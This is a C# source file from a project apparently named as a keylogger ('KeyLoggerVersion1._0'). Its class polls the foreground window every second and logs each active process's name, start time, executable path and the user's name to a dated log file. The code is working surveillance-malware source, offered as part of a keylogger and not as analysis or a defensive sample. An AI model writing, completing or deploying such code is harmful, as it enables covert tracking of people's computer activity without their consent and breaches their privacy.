using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace KeyLoggerVersion1._0
{
    class appActivate
    {
        public string NameProcess { get; set; }
        public string Time { get; set; }
        public string Path { get; set; }
    }
    public class HookActiveProcess
    {
        #region Get Active Process

        private static List<appActivate> start = new List<appActivate>();

        //private static void CheckappActive()
        //{
        //    IntPtr active_window = GetForegroundWindow();
        //    if (active_window == IntPtr.Zero)
        //    {
        //        appActive = false;
        //    }

        //    var procID = Process.GetCurrentProcess().Id;
        //    uint processID;
        //    GetWindowThreadProcessId(active_window, out processID);

        //    appActive = (procID == processID);
        //}
        private static Process GetProcessByHandle(IntPtr hwnd)
        {
            try
            {
                uint processID;
                API.GetWindowThreadProcessId(hwnd, out processID);
                return Process.GetProcessById((int)processID);
            }
            catch { return null; }
        }

        private static Process GetActiveProcess()
        {
            IntPtr hwnd = API.GetForegroundWindow();
            return hwnd != null ? GetProcessByHandle(hwnd) : null;
        }

        private static bool ListAndCheck(appActivate a)
        {
            bool check = false;
            start.Add(a);
            if (start.Count == 1) check = true;
            else
            {
                var duplicateExists = start.Where(x => x.NameProcess == a.NameProcess && x.Time == a.Time && x.Path == a.Path).Count();
                if (duplicateExists > 1)
                {
                    check = false;
                }
                else
                {
                    check = true;
                }
            }
            return check;
        }

        public static void NotificationWhenActivate()
        {
            if (!Directory.Exists(API.SaveLogFileText))
            {
                Directory.CreateDirectory(API.SaveLogFileText);
            }
            string path = API.SaveLogFileText + "/ActiveProcess" + " " + DateTime.Now.ToString("dd-MM-yyyy");
            while (API.appActive)
            {
                Process p = GetActiveProcess();
                if (p != null)
                {
                    try
                    {
                        appActivate a = new appActivate();
                        Dictionary<string, string> procs = new Dictionary<string, string>();
                        procs["Name"] = p.ProcessName.ToString();
                        procs["Time"] = p.StartTime.ToString("dd-MM-yyyy hh::mm::ss tt");
                        procs["Path"] = p.MainModule.FileName.ToString();
                        a.NameProcess = procs["Name"];
                        a.Time = procs["Time"];
                        a.Path = procs["Path"];

                        string process = "UserName: " + API.userName + Environment.NewLine +
                                         "NameProcess: " + procs["Name"] + Environment.NewLine +
                                         "TimeExcute: " + procs["Time"] + Environment.NewLine +
                                         "Path: " + procs["Path"];
                        using (StreamWriter sw = (File.Exists(path)) ? File.AppendText(path) : File.CreateText(path))
                        {
                            if (ListAndCheck(a) == true)
                            {
                                //Console.Write("\n\n" + process + "\n");
                                sw.Write("\n\n" + process + "\n");
                            }
                        }
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine();
                        Console.WriteLine(e.ToString());
                    }
                }
                Thread.Sleep(1000);
            }
        }

        #endregion Get Active Process


    }
}
